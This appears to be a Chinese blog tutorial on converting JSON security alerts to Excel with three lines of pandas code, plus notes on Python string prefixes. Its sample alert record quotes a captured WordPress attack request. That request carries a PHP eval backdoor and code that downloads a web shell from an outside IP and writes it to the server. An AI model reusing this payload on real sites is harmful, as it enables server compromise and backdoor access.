---
title: Python三行代码实现json转Excel
id: 2023081801
tags:
  - Python
categories:
  - - 技术
    - 开发
abbrlink: 213c546f
date: 2023-08-18 14:33:33
---
最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。
用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。
实现如下：
## 一、引包
引入pandas包，pandas写excel依赖openpyxl包所以也到导入

```bash
pip install pandas 
pip install openpyxl
```

## 二、代码

```python
import json
import pandas as pd
json_data=r'''
{
   "msg": "",
   "killChain": "02",
   "attackIllustration": "1起恶意盲打木马写入攻击",
   "traceSourceFlag": "01",
   "riskLevel": "02",
   "holeType": "",
   "discoveryTime": "2023-08-15 14:36:23",
   "disposalMeasure": "01",
   "informationSource": "长亭WAF",
   "disposalSuggestion": "建议封禁",
   "riskLevelPredue": "",
   "impactFlag": "02",
   "disposalOperateRecord": "WAF封禁",
   "serialNo": "ABC123",
   "sourceIpBelong": "美国",
   "potentialImpact": "无",
   "sourceIpType": "04",
   "protocalType": "HTTP",
   "disposalFlag": "01",
   "groupOrderType": "1",
   "comment": "通过微步溯源，IP归属地是美国",
   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",
   "taskId": "",
   "status": ""
}'''
dic_data = json.loads(json_data,strict=False)
df_data=pd.DataFrame(dic_data,index=[0])
df_data.to_excel('attack.xlsx')
```

效果：
![json转excel](http://image2.ishareread.com/images/2023/20230818/json转excel.png)

## 三、注意事项
因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于
`json.decoder.JSONDecodeError: Expecting ',' delimiter: line 50 column 149 (char 1339)`的错误。所以需要在字符串前面加`r`标识来忽略掉转义机制。

常见的字符串标识`u,r,b,f`
- 字符串前加u
后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。
- 字符串前加r
去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）
- 字符串前加b
b前缀表示：后面字符串是bytes 类型。
- 字符串前加f
以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。
如：

```python
name='xiejava'
outputstr=f'My name is {name}'
print(outputstr)
```

输出结果为：

```powershell
My name is xiejava
```
-------------
博客地址：[http://xiejava.ishareread.com/](http://xiejava.ishareread.com/)

<center> 

<br>

![“fullbug”微信公众号](http://image2.ishareread.com/images/fullbug微信公众号.jpg "“fullbug”微信公众号") 

关注微信公众号,一起学习、成长！</center>